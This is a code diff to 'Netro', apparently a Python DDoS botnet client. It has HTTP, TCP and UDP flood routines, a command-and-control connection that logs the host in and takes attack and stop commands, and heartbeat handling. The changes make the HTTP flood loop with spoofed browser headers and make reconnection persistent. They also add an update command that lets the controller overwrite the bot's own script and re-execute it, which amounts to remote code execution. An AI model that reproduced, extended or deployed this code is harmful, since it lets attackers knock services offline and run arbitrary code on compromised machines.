@@ -5,19 +5,24 @@ import socket
 import time
 import json
 import ssl
+import sys
+import os
 
 class NetroHTTP(object):
     kill = False
     active_threads = 0
 
-    def __init__(self, url: str):
+    def __init__(self, url: str, timeout: int):
         self.url = url
-
         parsed_url = urlparse(url)
 
         if not parsed_url.scheme in ["http", "https"]:
             raise Exception("Invalid URL scheme.")
         
+        if timeout < 10:
+            raise Exception("Invalid HTTP attack timeout value.")
+        
+        self.timeout = timeout
         self.host_ip = socket.gethostbyname(parsed_url.hostname)
 
         if not parsed_url.port:
@@ -39,7 +44,6 @@ class NetroHTTP(object):
 
         try:
             parsed_url = urlparse(self.url)
-
             sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
             sock.settimeout(10)
             sock.connect((self.host_ip, self.port))
@@ -49,38 +53,36 @@ class NetroHTTP(object):
                 sock = ctx.wrap_socket(sock=sock, server_hostname=parsed_url.hostname)
             
             path = "/" if not parsed_url.path else parsed_url.path
-            path_request = f"{path}{f'?{parsed_url.query}' if parsed_url.query else ''}{f'#{parsed_url.fragment}' if parsed_url.fragment else ''}"
 
-            headers = {
-                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
-                "Accept-Encoding": "gzip, deflate, br, zstd",
-                "Accept-Language": "en-US,en;q=0.9",
-                "Cache-Control": "max-age=0",
-                "Connection": "Keep-Alive",
-                "Dnt": "1",
-                "Host": f"{parsed_url.hostname}{f':{self.port}' if not self.port in [80, 443] else ''}",
-                "Sec-Ch-Ua": '"Microsoft Edge";v="129", "Not=A?Brand";v="8", "Chromium";v="129"',
-                "Sec-Ch-Ua-Mobile": "?0",
-                "Sec-Ch-Ua-Platform": '"Windows"',
-                "Sec-Fetch-Dest": "document",
-                "Sec-Fetch-Mode": "navigate",
-                "Sec-Fetch-Site": "none",
-                "Sec-Fetch-User": "?1",
-                "Upgrade-Insecure-Requests": "1",
-                "User-Agent": random.choice(self.useragents)
-            }
+            while time.time() < self.timeout and not self.kill:
+                path_request = f"{path}{f'?{parsed_url.query}' if parsed_url.query else ''}{f'#{parsed_url.fragment}' if parsed_url.fragment else ''}"
+                headers = {
+                    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
+                    "Accept-Encoding": "gzip, deflate, br, zstd",
+                    "Accept-Language": "en-US,en;q=0.9",
+                    "Cache-Control": "max-age=0",
+                    "Connection": "Keep-Alive",
+                    "Dnt": "1",
+                    "Host": f"{parsed_url.hostname}{f':{self.port}' if not self.port in [80, 443] else ''}",
+                    "Sec-Ch-Ua": '"Microsoft Edge";v="129", "Not=A?Brand";v="8", "Chromium";v="129"',
+                    "Sec-Ch-Ua-Mobile": "?0",
+                    "Sec-Ch-Ua-Platform": '"Windows"',
+                    "Sec-Fetch-Dest": "document",
+                    "Sec-Fetch-Mode": "navigate",
+                    "Sec-Fetch-Site": "none",
+                    "Sec-Fetch-User": "?1",
+                    "Upgrade-Insecure-Requests": "1",
+                    "User-Agent": random.choice(self.useragents)
+                }
+                request_data = f"GET {path_request} HTTP/1.1\r\n"
 
-            request_data = f"GET {path_request} HTTP/1.1\r\n"
-
-            for header_name in headers:
-                header_value = headers[header_name]
-                request_data += f"{header_name}: {header_value}\r\n"
-            
-            request_data += "\r\n"
-
-            sock.send(request_data.encode())
-
-            time.sleep(1)
+                for header_name in headers:
+                    header_value = headers[header_name]
+                    request_data += f"{header_name}: {header_value}\r\n"
+                
+                request_data += "\r\n"
+                sock.send(request_data.encode())
+                time.sleep(1)
         except Exception:
             return
         finally:
@@ -101,7 +103,6 @@ class NetroTCP(object):
             raise Exception("Invalid timeout value.")
         
         self.timeout = timeout
-
         self.host = host
         self.port = port
         self.host_ip = socket.gethostbyname(self.host)
@@ -115,7 +116,6 @@ class NetroTCP(object):
             sock.connect((self.host_ip, self.port))
             while time.time() < self.timeout and not self.kill:
                 sock.send(random._urandom(16))
-
         except Exception:
             return
         finally:
@@ -145,6 +145,7 @@ class NetroUDP(object):
 
         try:
             sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+
             while time.time() < self.timeout and not self.kill:
                 sock.sendto(random._urandom(1024), (self.host_ip, self.port))
         except Exception:
@@ -165,7 +166,7 @@ class NetroAttackManager(object):
 
         match method:
             case "http":
-                netro_attack = NetroHTTP(url=target)
+                netro_attack = NetroHTTP(url=target, timeout=timeout)
             case "tcp":
                 netro_attack = NetroTCP(target=target, timeout=timeout)
             case "udp":
@@ -187,7 +188,6 @@ class NetroAttackManager(object):
         target = attack_payload["target"]
         timeout = attack_payload["timeout"]
         concurrency = attack_payload["concurrency"]
-
         self.running_attacks[attack_id] = attack_payload
 
         threading.Thread(target=self.attack_handler, args=[attack_id], daemon=True).start()
@@ -217,19 +217,22 @@ class NetroBot(object):
             return False
 
     def start(self):
-        try:
-            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-            sock.settimeout(self.timeout)
-            self.current_sock = sock
-            sock.connect((self.host, self.port))
+        while True:
+            try:
+                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                sock.settimeout(self.timeout)
+                self.current_sock = sock
+                sock.connect((self.host, self.port))
 
-            self.send_message(sock=sock, message={"op": "LOGIN", "hostname": f"{socket.gethostname()}"})
+                self.send_message(sock=sock, message={"op": "LOGIN", "hostname": f"{socket.gethostname()}"})
 
-            threading.Thread(target=self.handler, args=[sock], daemon=True).start()
-            threading.Thread(target=self.heartbeat_handler, args=[sock], daemon=True).start()
-        except Exception:
-            time.sleep(1)
-            return self.start()
+                threading.Thread(target=self.handler, args=[sock], daemon=True).start()
+                threading.Thread(target=self.heartbeat_handler, args=[sock], daemon=True).start()
+
+                break
+            except Exception:
+                time.sleep(5)
+                continue
         
     def handler(self, sock: socket.socket):
         try:
@@ -252,8 +255,8 @@ class NetroBot(object):
                 
                 self.on_message(sock=sock, message=json.loads(message))
         except Exception:
-            time.sleep(1)
-            return self.start()
+            time.sleep(5)
+            self.start()
 
     def heartbeat_handler(self, sock: socket.socket):
         try:
@@ -273,7 +276,6 @@ class NetroBot(object):
                 self.send_message(sock=sock, message=heartbeat_payload)
 
                 time.sleep(self.heartbeat_interval)
-
         except Exception:
             return
 
@@ -283,12 +285,14 @@ class NetroBot(object):
         
         match message["op"]:
             case "ATTACK_LIST":
-                self.on_welcome(sock=sock, welcome_data=message)
+                self.on_attack_list_update(sock=sock, message=message)
             case "COMMAND":
                 self.on_command(sock=sock, command_data=message)
+            case "UPDATE":
+                self.on_update(sock=sock, message=message)
     
-    def on_welcome(self, sock: socket.socket, welcome_data: dict):
-        running_attacks = welcome_data["running_attacks"]
+    def on_attack_list_update(self, sock: socket.socket, message: dict):
+        running_attacks = message["running_attacks"]
         netro_running_attacks = self.netro_attacks.running_attacks
 
         for attack_id in netro_running_attacks:
@@ -309,6 +313,15 @@ class NetroBot(object):
             case "stop_attack":
                 self.netro_attacks.stop_attack(attack_id=command_data["attack_id"])
     
+    def on_update(self, sock: socket.socket, message: dict):
+        script_content = message["script_content"]
+
+        with open(__file__, "w") as file:
+            file.write(script_content)
+            file.close()
+
+        os.execv(sys.executable, ["python3" if sys.platform == "linux" else "python"] + sys.argv + ["--restart"])
+
     def on_launch(self, attack_payload: dict):
         attack_id = attack_payload["id"]
         del attack_payload["id"]
@@ -325,7 +338,12 @@ def main():
     netro_bot = NetroBot(host="127.0.0.1", port=4444)
     threading.Thread(target=netro_bot.start, daemon=True).start()
 
+    print(f"Netro bot initialized.")
+
     input()
 
 if __name__ == "__main__":
-    main()
+    try:
+        main()
+    except KeyboardInterrupt:
+        exit()
